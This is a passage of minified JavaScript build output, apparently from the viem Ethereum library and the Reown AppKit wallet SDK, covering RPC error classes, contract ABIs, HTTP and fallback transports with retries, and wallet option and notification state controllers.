ca{constructor(e,{method:n}={}){super(e,{code:Dm.code,name:"MethodNotSupportedRpcError",shortMessage:`Method${n?` "${n}"`:""} is not supported.`})}}Object.defineProperty(Dm,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class _1 extends ca{constructor(e){super(e,{code:_1.code,name:"LimitExceededRpcError",shortMessage:"Request exceeds defined limit."})}}Object.defineProperty(_1,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class VE extends ca{constructor(e){super(e,{code:VE.code,name:"JsonRpcVersionUnsupportedError",shortMessage:"Version of JSON-RPC protocol is not supported."})}}Object.defineProperty(VE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class Zm extends Xa{constructor(e){super(e,{code:Zm.code,name:"UserRejectedRequestError",shortMessage:"User rejected the request."})}}Object.defineProperty(Zm,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class WE extends Xa{constructor(e){super(e,{code:WE.code,name:"UnauthorizedProviderError",shortMessage:"The requested method and/or account has not been authorized by the user."})}}Object.defineProperty(WE,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class GE extends Xa{constructor(e,{method:n}={}){super(e,{code:GE.code,name:"UnsupportedProviderMethodError",shortMessage:`The Provider does not support the requested method${n?` " ${n}"`:""}.`})}}Object.defineProperty(GE,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class KE extends Xa{constructor(e){super(e,{code:KE.code,name:"ProviderDisconnectedError",shortMessage:"The Provider is disconnected from all chains."})}}Object.defineProperty(KE,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class ZE extends Xa{constructor(e){super(e,{code:ZE.code,name:"ChainDisconnectedError",shortMessage:"The Provider is not connected to the requested chain."})}}Object.defineProperty(ZE,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class YE extends Xa{constructor(e){super(e,{code:YE.code,name:"SwitchChainError",shortMessage:"An error occurred when attempting to switch chain."})}}Object.defineProperty(YE,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class QE extends Xa{constructor(e){super(e,{code:QE.code,name:"UnsupportedNonOptionalCapabilityError",shortMessage:"This Wallet does not support a capability that was not marked as optional."})}}Object.defineProperty(QE,"code",{enumerable:!0,configurable:!0,writable:!0,value:5700});class JE extends Xa{constructor(e){super(e,{code:JE.code,name:"UnsupportedChainIdError",shortMessage:"This Wallet does not support the requested chain ID."})}}Object.defineProperty(JE,"code",{enumerable:!0,configurable:!0,writable:!0,value:5710});class XE extends Xa{constructor(e){super(e,{code:XE.code,name:"DuplicateIdError",shortMessage:"There is already a bundle submitted with this ID."})}}Object.defineProperty(XE,"code",{enumerable:!0,configurable:!0,writable:!0,value:5720});class e_ extends Xa{constructor(e){super(e,{code:e_.code,name:"UnknownBundleIdError",shortMessage:"This bundle id is unknown / has not been submitted"})}}Object.defineProperty(e_,"code",{enumerable:!0,configurable:!0,writable:!0,value:5730});class t_ extends Xa{constructor(e){super(e,{code:t_.code,name:"BundleTooLargeError",shortMessage:"The call bundle is too large for the Wallet to process."})}}Object.defineProperty(t_,"code",{enumerable:!0,configurable:!0,writable:!0,value:5740});class n_ extends Xa{constructor(e){super(e,{code:n_.code,name:"AtomicReadyWalletRejectedUpgradeError",shortMessage:"The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."})}}Object.defineProperty(n_,"code",{enumerable:!0,configurable:!0,writable:!0,value:5750});class r_ extends Xa{constructor(e){super(e,{code:r_.code,name:"AtomicityNotSupportedError",shortMessage:"The wallet does not support atomic execution but the request requires it."})}}Object.defineProperty(r_,"code",{enumerable:!0,configurable:!0,writable:!0,value:5760});class Tbe extends ca{constructor(e){super(e,{name:"UnknownRpcError",shortMessage:"An unknown RPC error occurred."})}}const xbe="modulepreload",Ibe=function(t){return"/"+t},bH={},pt=function(e,n,r){let i=Promise.resolve();if(n&&n.length>0){let c=function(l){return Promise.all(l.map(f=>Promise.resolve(f).then(h=>({status:"fulfilled",value:h}),h=>({status:"rejected",reason:h}))))};document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),a=o?.nonce||o?.getAttribute("nonce");i=c(n.map(l=>{if(l=Ibe(l),l in bH)return;bH[l]=!0;const f=l.endsWith(".css"),h=f?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${l}"]${h}`))return;const m=document.createElement("link");if(m.rel=f?"stylesheet":xbe,f||(m.as="script"),m.crossOrigin="",m.href=l,a&&m.setAttribute("nonce",a),document.head.appendChild(m),f)return new Promise((b,w)=>{m.addEventListener("load",b),m.addEventListener("error",()=>w(new Error(`Unable to preload CSS for ${l}`)))})}))}function s(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return i.then(o=>{for(const a of o||[])a.status==="rejected"&&s(a.reason);return e().catch(s)})};class iB extends Tr{constructor({cause:e,message:n}={}){const r=n?.replace("execution reverted: ","")?.replace("execution reverted","");super(`Execution reverted ${r?`with reason: ${r}`:"for an unknown reason"}.`,{cause:e,name:"ExecutionRevertedError"})}}Object.defineProperty(iB,"code",{enumerable:!0,configurable:!0,writable:!0,value:3});Object.defineProperty(iB,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class Rbe extends Tr{constructor({cause:e,maxFeePerGas:n}={}){super(`The fee cap (\`maxFeePerGas\`${n?` = ${bx(n)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:e,name:"FeeCapTooHighError"})}}Object.defineProperty(Rbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class Pbe extends Tr{constructor({cause:e,maxFeePerGas:n}={}){super(`The fee cap (\`maxFeePerGas\`${n?` = ${bx(n)}`:""} gwei) cannot be lower than the block base fee.`,{cause:e,name:"FeeCapTooLowError"})}}Object.defineProperty(Pbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/});class Nbe extends Tr{constructor({cause:e,nonce:n}={}){super(`Nonce provided for the transaction ${n?`(${n}) `:""}is higher than the next one expected.`,{cause:e,name:"NonceTooHighError"})}}Object.defineProperty(Nbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too high/});class Obe extends Tr{constructor({cause:e,nonce:n}={}){super([`Nonce provided for the transaction ${n?`(${n}) `:""}is lower than the current nonce of the account.`,"Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`),{cause:e,name:"NonceTooLowError"})}}Object.defineProperty(Obe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too low|transaction already imported|already known/});class kbe extends Tr{constructor({cause:e,nonce:n}={}){super(`Nonce provided for the transaction ${n?`(${n}) `:""}exceeds the maximum allowed nonce.`,{cause:e,name:"NonceMaxValueError"})}}Object.defineProperty(kbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce has max value/});class Dbe extends Tr{constructor({cause:e}={}){super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`),{cause:e,metaMessages:["This error could arise when the account does not have enough funds to:"," - pay for the total gas fee,"," - pay for the value to send."," ","The cost of the transaction is calculated as `gas * gas fee + value`, where:"," - `gas` is the amount of gas needed for transaction to execute,"," - `gas fee` is the gas fee,"," - `value` is the amount of ether to send to the recipient."],name:"InsufficientFundsError"})}}Object.defineProperty(Dbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/insufficient funds|exceeds transaction sender account balance/});class Bbe extends Tr{constructor({cause:e,gas:n}={}){super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction exceeds the limit allowed for the block.`,{cause:e,name:"IntrinsicGasTooHighError"})}}Object.defineProperty(Bbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too high|gas limit reached/});class jbe extends Tr{constructor({cause:e,gas:n}={}){super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction is too low.`,{cause:e,name:"IntrinsicGasTooLowError"})}}Object.defineProperty(jbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too low/});class Mbe extends Tr{constructor({cause:e}){super("The transaction type is not supported for this chain.",{cause:e,name:"TransactionTypeNotSupportedError"})}}Object.defineProperty(Mbe,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/transaction type not valid/});class Ube extends Tr{constructor({cause:e,maxPriorityFeePerGas:n,maxFeePerGas:r}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${n?` = ${bx(n)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${r?` = ${bx(r)} gwei`:""}).`].join(`
`),{cause:e,name:"TipAboveFeeCapError"})}}Object.defineProperty(Ube,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});class gZe extends Tr{constructor({cause:e}){super(`An error occurred while executing: ${e?.shortMessage}`,{cause:e,name:"UnknownNodeError"})}}const yZe=[{inputs:[{components:[{name:"target",type:"address"},{name:"allowFailure",type:"bool"},{name:"callData",type:"bytes"}],name:"calls",type:"tuple[]"}],name:"aggregate3",outputs:[{components:[{name:"success",type:"bool"},{name:"returnData",type:"bytes"}],name:"returnData",type:"tuple[]"}],stateMutability:"view",type:"function"},{inputs:[],name:"getCurrentBlockTimestamp",outputs:[{internalType:"uint256",name:"timestamp",type:"uint256"}],stateMutability:"view",type:"function"}],bZe=[{name:"query",type:"function",stateMutability:"view",inputs:[{type:"tuple[]",name:"queries",components:[{type:"address",name:"sender"},{type:"string[]",name:"urls"},{type:"bytes",name:"data"}]}],outputs:[{type:"bool[]",name:"failures"},{type:"bytes[]",name:"responses"}]},{name:"HttpError",type:"error",inputs:[{type:"uint16",name:"status"},{type:"string",name:"message"}]}],Hre=[{inputs:[{name:"dns",type:"bytes"}],name:"DNSDecodingFailed",type:"error"},{inputs:[{name:"ens",type:"string"}],name:"DNSEncodingFailed",type:"error"},{inputs:[],name:"EmptyAddress",type:"error"},{inputs:[{name:"status",type:"uint16"},{name:"message",type:"string"}],name:"HttpError",type:"error"},{inputs:[],name:"InvalidBatchGatewayResponse",type:"error"},{inputs:[{name:"errorData",type:"bytes"}],name:"ResolverError",type:"error"},{inputs:[{name:"name",type:"bytes"},{name:"resolver",type:"address"}],name:"ResolverNotContract",type:"error"},{inputs:[{name:"name",type:"bytes"}],name:"ResolverNotFound",type:"error"},{inputs:[{name:"primary",type:"string"},{name:"primaryAddress",type:"bytes"}],name:"ReverseAddressMismatch",type:"error"},{inputs:[{internalType:"bytes4",name:"selector",type:"bytes4"}],name:"UnsupportedResolverProfile",type:"error"}],wZe=[...Hre,{name:"resolveWithGateways",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes"},{name:"data",type:"bytes"},{name:"gateways",type:"string[]"}],outputs:[{name:"",type:"bytes"},{name:"address",type:"address"}]}],vZe=[...Hre,{name:"reverseWithGateways",type:"function",stateMutability:"view",inputs:[{type:"bytes",name:"reverseName"},{type:"uint256",name:"coinType"},{type:"string[]",name:"gateways"}],outputs:[{type:"string",name:"resolvedName"},{type:"address",name:"resolver"},{type:"address",name:"reverseResolver"}]}],EZe=[{name:"text",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"key",type:"string"}],outputs:[{name:"",type:"string"}]}],_Ze=[{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"}],outputs:[{name:"",type:"address"}]},{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"coinType",type:"uint256"}],outputs:[{name:"",type:"bytes"}]}],AZe=[{name:"isValidSignature",type:"function",stateMutability:"view",inputs:[{name:"hash",type:"bytes32"},{name:"signature",type:"bytes"}],outputs:[{name:"",type:"bytes4"}]}],CZe=[{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],stateMutability:"nonpayable",type:"constructor"},{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function",name:"isValidSig"}],x3=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"function",name:"allowance",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{type:"uint8"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{type:"uint256"}]},{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}];function Lbe(){let t=()=>{},e=()=>{};return{promise:new Promise((r,i)=>{t=r,e=i}),resolve:t,reject:e}}const PN=new Map;function Fbe({fn:t,id:e,shouldSplitBatch:n,wait:r=0,sort:i}){const s=async()=>{const f=c();o();const h=f.map(({args:m})=>m);h.length!==0&&t(h).then(m=>{i&&Array.isArray(m)&&m.sort(i);for(let b=0;b<f.length;b++){const{resolve:w}=f[b];w?.([m[b],m])}}).catch(m=>{for(let b=0;b<f.length;b++){const{reject:w}=f[b];w?.(m)}})},o=()=>PN.delete(e),a=()=>c().map(({args:f})=>f),c=()=>PN.get(e)||[],l=f=>PN.set(e,[...c(),f]);return{flush:o,async schedule(f){const{promise:h,resolve:m,reject:b}=Lbe();return n?.([...a(),f])&&s(),c().length>0?(l({args:f,resolve:m,reject:b}),h):(l({args:f,resolve:m,reject:b}),setTimeout(s,r),h)}}}async function zre(t){return new Promise(e=>setTimeout(e,t))}function $be(t,{delay:e=100,retryCount:n=2,shouldRetry:r=()=>!0}={}){return new Promise((i,s)=>{const o=async({count:a=0}={})=>{const c=async({error:l})=>{const f=typeof e=="function"?e({count:a,error:l}):e;f&&await zre(f),o({count:a+1})};try{const l=await t();i(l)}catch(l){if(a<n&&await r({count:a,error:l}))return c({error:l});s(l)}};o()})}const Dk=256;let I3=Dk,R3;function Hbe(t=11){if(!R3||I3+t>Dk*2){R3="",I3=0;for(let e=0;e<Dk;e++)R3+=(256+Math.random()*256|0).toString(16).substring(1)}return R3.substring(I3,I3+++t)}const P3=new Abe(8192);function zbe(t,{enabled:e=!0,id:n}){if(!e||!n)return t();if(P3.get(n))return P3.get(n);const r=t().finally(()=>P3.delete(n));return P3.set(n,r),r}function qbe(t,e={}){return async(n,r={})=>{const{dedupe:i=!1,methods:s,retryDelay:o=150,retryCount:a=3,uid:c}={...e,...r},{method:l}=n;if(s?.exclude?.includes(l))throw new Dm(new Error("method not supported"),{method:l});if(s?.include&&!s.include.includes(l))throw new Dm(new Error("method not supported"),{method:l});const f=i?Fre(`${c}.${Km(n)}`):void 0;return zbe(()=>$be(async()=>{try{return await t(n)}catch(h){const m=h;switch(m.code){case UE.code:throw new UE(m);case LE.code:throw new LE(m);case FE.code:throw new FE(m,{method:n.method});case $E.code:throw new $E(m);case v1.code:throw new v1(m);case HE.code:throw new HE(m);case zE.code:throw new zE(m);case qE.code:throw new qE(m);case E1.code:throw new E1(m);case Dm.code:throw new Dm(m,{method:n.method});case _1.code:throw new _1(m);case VE.code:throw new VE(m);case Zm.code:throw new Zm(m);case WE.code:throw new WE(m);case GE.code:throw new GE(m);case KE.code:throw new KE(m);case ZE.code:throw new ZE(m);case YE.code:throw new YE(m);case QE.code:throw new QE(m);case JE.code:throw new JE(m);case XE.code:throw new XE(m);case e_.code:throw new e_(m);case t_.code:throw new t_(m);case n_.code:throw new n_(m);case r_.code:throw new r_(m);case 5e3:throw new Zm(m);default:throw h instanceof Tr?h:new Tbe(m)}}},{delay:({count:h,error:m})=>{if(m&&m instanceof nE){const b=m?.headers?.get("Retry-After");if(b?.match(/\d/))return Number.parseInt(b,10)*1e3}return~~(1<<h)*o},retryCount:a,shouldRetry:({error:h})=>Vbe(h)}),{enabled:i,id:f})}}function Vbe(t){return"code"in t&&typeof t.code=="number"?t.code===-1||t.code===_1.code||t.code===v1.code:t instanceof nE&&t.status?t.status===403||t.status===408||t.status===413||t.status===429||t.status===500||t.status===502||t.status===503||t.status===504:!0}function Wbe(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}function Gbe(t,{errorInstance:e=new Error("timed out"),timeout:n,signal:r}){return new Promise((i,s)=>{(async()=>{let o;try{const a=new AbortController;n>0&&(o=setTimeout(()=>{r&&a.abort()},n)),i(await t({signal:a?.signal||null}))}catch(a){a?.name==="AbortError"&&s(e),s(a)}finally{clearTimeout(o)}})()})}function Kbe(){return{current:0,take(){return this.current++},reset(){this.current=0}}}const wH=Kbe();function Zbe(t,e={}){return{async request(n){const{body:r,fetchFn:i=e.fetchFn??fetch,onRequest:s=e.onRequest,onResponse:o=e.onResponse,timeout:a=e.timeout??1e4}=n,c={...e.fetchOptions??{},...n.fetchOptions??{}},{headers:l,method:f,signal:h}=c;try{const m=await Gbe(async({signal:w})=>{const y={...c,body:Array.isArray(r)?Km(r.map(S=>({jsonrpc:"2.0",id:S.id??wH.take(),...S}))):Km({jsonrpc:"2.0",id:r.id??wH.take(),...r}),headers:{"Content-Type":"application/json",...l},method:f||"POST",signal:h||(a>0?w:null)},E=new Request(t,y),A=await s?.(E,y)??{...y,url:t};return await i(A.url??t,A)},{errorInstance:new yH({body:r,url:t}),timeout:a,signal:!0});o&&await o(m);let b;if(m.headers.get("Content-Type")?.startsWith("application/json"))b=await m.json();else{b=await m.text();try{b=JSON.parse(b||"{}")}catch(w){if(m.ok)throw w;b={error:b}}}if(!m.ok)throw new nE({body:r,details:Km(b.error)||m.statusText,headers:m.headers,status:m.status,url:t});return b}catch(m){throw m instanceof nE||m instanceof yH?m:new nE({body:r,cause:m,url:t})}}}}function qre({key:t,methods:e,name:n,request:r,retryCount:i=3,retryDelay:s=150,timeout:o,type:a},c){const l=Hbe();return{config:{key:t,methods:e,name:n,request:r,retryCount:i,retryDelay:s,timeout:o,type:a},request:qbe(r,{methods:e,retryCount:i,retryDelay:s,uid:l}),value:c}}function vH(t,e={}){const{key:n="fallback",name:r="Fallback",rank:i=!1,shouldThrow:s=Ybe,retryCount:o,retryDelay:a}=e;return(({chain:c,pollingInterval:l=4e3,timeout:f,...h})=>{let m=t,b=()=>{};const w=qre({key:n,name:r,async request({method:y,params:E}){let A;const R=async(S=0)=>{const v=m[S]({...h,chain:c,retryCount:0,timeout:f});try{const k=await v.request({method:y,params:E});return b({method:y,params:E,response:k,transport:v,status:"success"}),k}catch(k){if(b({error:k,method:y,params:E,transport:v,status:"error"}),s(k)||S===m.length-1||(A??=m.slice(S+1).some(O=>{const{include:_,exclude:I}=O({chain:c}).config.methods||{};return _?_.includes(y):I?!I.includes(y):!0}),!A))throw k;return R(S+1)}};return R()},retryCount:o,retryDelay:a,type:"fallback"},{onResponse:y=>b=y,transports:m.map(y=>y({chain:c,retryCount:0}))});if(i){const y=typeof i=="object"?i:{};Qbe({chain:c,interval:y.interval??l,onTransports:E=>m=E,ping:y.ping,sampleCount:y.sampleCount,timeout:y.timeout,transports:m,weights:y.weights})}return w})}function Ybe(t){return!!("code"in t&&typeof t.code=="number"&&(t.code===E1.code||t.code===Zm.code||iB.nodeMessage.test(t.message)||t.code===5e3))}function Qbe({chain:t,interval:e=4e3,onTransports:n,ping:r,sampleCount:i=10,timeout:s=1e3,transports:o,weights:a={}}){const{stability:c=.7,latency:l=.3}=a,f=[],h=async()=>{const m=await Promise.all(o.map(async y=>{const E=y({chain:t,retryCount:0,timeout:s}),A=Date.now();let R,S;try{await(r?r({transport:E}):E.request({method:"net_listening"})),S=1}catch{S=0}finally{R=Date.now()}return{latency:R-A,success:S}}));f.push(m),f.length>i&&f.shift();const b=Math.max(...f.map(y=>Math.max(...y.map(({latency:E})=>E)))),w=o.map((y,E)=>{const A=f.map(O=>O[E].latency),S=1-A.reduce((O,_)=>O+_,0)/A.length/b,v=f.map(O=>O[E].success),k=v.reduce((O,_)=>O+_,0)/v.length;return k===0?[0,E]:[l*S+c*k,E]}).sort((y,E)=>E[0]-y[0]);n(w.map(([,y])=>o[y])),await zre(e),h()};h()}class Jbe extends Tr{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro",name:"UrlRequiredError"})}}function N3(t,e={}){const{batch:n,fetchFn:r,fetchOptions:i,key:s="http",methods:o,name:a="HTTP JSON-RPC",onFetchRequest:c,onFetchResponse:l,retryDelay:f,raw:h}=e;return({chain:m,retryCount:b,timeout:w})=>{const{batchSize:y=1e3,wait:E=0}=typeof n=="object"?n:{},A=e.retryCount??b,R=w??e.timeout??1e4,S=t||m?.rpcUrls.default.http[0];if(!S)throw new Jbe;const v=Zbe(S,{fetchFn:r,fetchOptions:i,onRequest:c,onResponse:l,timeout:R});return qre({key:s,methods:o,name:a,async request({method:k,params:O}){const _={method:k,params:O},{schedule:I}=Fbe({id:S,wait:E,shouldSplitBatch(M){return M.length>y},fn:M=>v.request({body:M}),sort:(M,N)=>M.id-N.id}),T=async M=>n?I(M):[await v.request({body:M})],[{error:B,result:U}]=await T(_);if(h)return{error:B,result:U};if(B)throw new $re({body:_,error:B,url:S});return U},retryCount:A,retryDelay:f,timeout:R,type:"http"},{fetchOptions:i,url:S})}}async function yv(...t){const e=await fetch(...t);if(!e.ok)throw new Error(`HTTP status code: ${e.status}`,{cause:e});return e}class W_{constructor({baseUrl:e,clientId:n}){this.baseUrl=e,this.clientId=n}async get({headers:e,signal:n,cache:r,...i}){const s=this.createUrl(i);return(await yv(s,{method:"GET",headers:e,signal:n,cache:r})).json()}async getBlob({headers:e,signal:n,...r}){const i=this.createUrl(r);return(await yv(i,{method:"GET",headers:e,signal:n})).blob()}async post({body:e,headers:n,signal:r,...i}){const s=this.createUrl(i);return(await yv(s,{method:"POST",headers:n,body:e?JSON.stringify(e):void 0,signal:r})).json()}async put({body:e,headers:n,signal:r,...i}){const s=this.createUrl(i);return(await yv(s,{method:"PUT",headers:n,body:e?JSON.stringify(e):void 0,signal:r})).json()}async delete({body:e,headers:n,signal:r,...i}){const s=this.createUrl(i);return(await yv(s,{method:"DELETE",headers:n,body:e?JSON.stringify(e):void 0,signal:r})).json()}createUrl({path:e,params:n}){const r=new URL(e,this.baseUrl);return n&&Object.entries(n).forEach(([i,s])=>{s&&r.searchParams.append(i,s)}),this.clientId&&r.searchParams.append("clientId",this.clientId),r}sendBeacon({body:e,...n}){const r=this.createUrl(n);return navigator.sendBeacon(r.toString(),e?JSON.stringify(e):void 0)}}const Bk={getFeatureValue(t,e){const n=e?.[t];return n===void 0?jt.DEFAULT_FEATURES[t]:n},filterSocialsByPlatform(t){if(!t||!t.length)return t;let e=t;return xe.isTelegram()&&(xe.isIos()&&(e=e.filter(n=>n!=="google")),xe.isMac()&&(e=e.filter(n=>n!=="x")),xe.isAndroid()&&(e=e.filter(n=>!["facebook","x"].includes(n)))),xe.isMobile()&&(e=e.filter(n=>n!=="facebook")),e},isSocialsEnabled(){return Array.isArray(de.state.features?.socials)&&de.state.features?.socials.length>0||Array.isArray(de.state.remoteFeatures?.socials)&&de.state.remoteFeatures?.socials.length>0},isEmailEnabled(){return!!(de.state.features?.email||de.state.remoteFeatures?.email)}},Tt=ar({features:jt.DEFAULT_FEATURES,projectId:"",sdkType:"appkit",sdkVersion:"html-wagmi-undefined",defaultAccountTypes:jt.DEFAULT_ACCOUNT_TYPES,enableNetworkSwitch:!0,experimental_preferUniversalLinks:!1,remoteFeatures:{},enableMobileFullScreen:!1,coinbasePreference:"all"}),de={state:Tt,subscribeKey(t,e){return Mi(Tt,t,e)},setOptions(t){Object.assign(Tt,t)},setRemoteFeatures(t){if(!t)return;const e={...Tt.remoteFeatures,...t};Tt.remoteFeatures=e,Tt.remoteFeatures?.socials&&(Tt.remoteFeatures.socials=Bk.filterSocialsByPlatform(Tt.remoteFeatures.socials)),Tt.features?.pay&&(Tt.remoteFeatures.email=!1,Tt.remoteFeatures.socials=!1)},setFeatures(t){if(!t)return;Tt.features||(Tt.features=jt.DEFAULT_FEATURES);const e={...Tt.features,...t};Tt.features=e,Tt.features?.pay&&Tt.remoteFeatures&&(Tt.remoteFeatures.email=!1,Tt.remoteFeatures.socials=!1)},setProjectId(t){Tt.projectId=t},setCustomRpcUrls(t){Tt.customRpcUrls=t},setAllWallets(t){Tt.allWallets=t},setIncludeWalletIds(t){Tt.includeWalletIds=t},setExcludeWalletIds(t){Tt.excludeWalletIds=t},setFeaturedWalletIds(t){Tt.featuredWalletIds=t},setTokens(t){Tt.tokens=t},setTermsConditionsUrl(t){Tt.termsConditionsUrl=t},setPrivacyPolicyUrl(t){Tt.privacyPolicyUrl=t},setCustomWallets(t){Tt.customWallets=t},setIsSiweEnabled(t){Tt.isSiweEnabled=t},setIsUniversalProvider(t){Tt.isUniversalProvider=t},setSdkVersion(t){Tt.sdkVersion=t},setMetadata(t){Tt.metadata=t},setDisableAppend(t){Tt.disableAppend=t},setEIP6963Enabled(t){Tt.enableEIP6963=t},setDebug(t){Tt.debug=t},setEnableWalletGuide(t){Tt.enableWalletGuide=t},setEnableAuthLogger(t){Tt.enableAuthLogger=t},setEnableWallets(t){Tt.enableWallets=t},setPreferUniversalLinks(t){Tt.experimental_preferUniversalLinks=t},setSIWX(t){if(t)for(const[e,n]of Object.entries(jt.SIWX_DEFAULTS))t[e]??=n;Tt.siwx=t},setConnectMethodsOrder(t){Tt.features={...Tt.features,connectMethodsOrder:t}},setWalletFeaturesOrder(t){Tt.features={...Tt.features,walletFeaturesOrder:t}},setSocialsOrder(t){Tt.remoteFeatures={...Tt.remoteFeatures,socials:t}},setCollapseWallets(t){Tt.features={...Tt.features,collapseWallets:t}},setEnableEmbedded(t){Tt.enableEmbedded=t},setAllowUnsupportedChain(t){Tt.allowUnsupportedChain=t},setManualWCControl(t){Tt.manualWCControl=t},setEnableNetworkSwitch(t){Tt.enableNetworkSwitch=t},setEnableMobileFullScreen(t){Tt.enableMobileFullScreen=xe.isMobile()&&t},setEnableReconnect(t){Tt.enableReconnect=t},setCoinbasePreference(t){Tt.coinbasePreference=t},setDefaultAccountTypes(t={}){Object.entries(t).forEach(([e,n])=>{n&&(Tt.defaultAccountTypes[e]=n)})},setUniversalProviderConfigOverride(t){Tt.universalProviderConfigOverride=t},getUniversalProviderConfigOverride(){return Tt.universalProviderConfigOverride},getSnapshot(){return AE(Tt)}},_m=Object.freeze({message:"",variant:"success",svg:void 0,open:!1,autoClose:!0}),Li=ar({..._m}),Xbe={state:Li,subscribeKey(t,e){return Mi(Li,t,e)},showLoading(t,e={}){this._showMessage({message:t,variant:"loading",...e})},showSuccess(t){this._showMessage({message:t,variant:"success"})},showSvg(t,e){this._showMessage({message:t,svg:e})},showError(t){const e=xe.parseError(t);this._showMessage({message:e,variant:"error"})},hide(){Li.message=_m.message,Li.variant=_m.variant,Li.svg=_m.svg,Li.open=_m.open,Li.autoClose=_m.autoClose},_showMessage({message:t,svg:e,variant:n="success",autoClose:r=_m.autoClose}){Li.open?(Li.open=!1,setTimeout(()=>{Li.message=t,Li.variant=n,Li.svg=e,Li.open=!0,Li.autoClose=r},150)):(Li.message=t,Li.variant=n,Li.svg=e,Li.open=!0,Li.autoClose=r)}},on=Xbe,e1e={purchaseCurrencies:[{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"Ether",symbol:"ETH",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]}],paymentCurrencies:[{id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},{id:"EUR",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]}]},Vre=xe.getBlockchainApiUrl(),so=ar({clientId:null,api:new W_({baseUrl:Vre,clientId:null}),supportedChains:{http:[],ws:[]}}),Bt={state:so,async get(t){const{st:e,sv:n}=Bt.getSdkProperties(),r=de.state.projectId,i={...t.params||{},st:e,sv:n,projectId:r};return so.api.get({...t,params:i})},getSdkProperties(){const{sdkType:t,sdkVersion:e}=de.state;return{st:t||"unknown",sv:e||"unknown"}},async 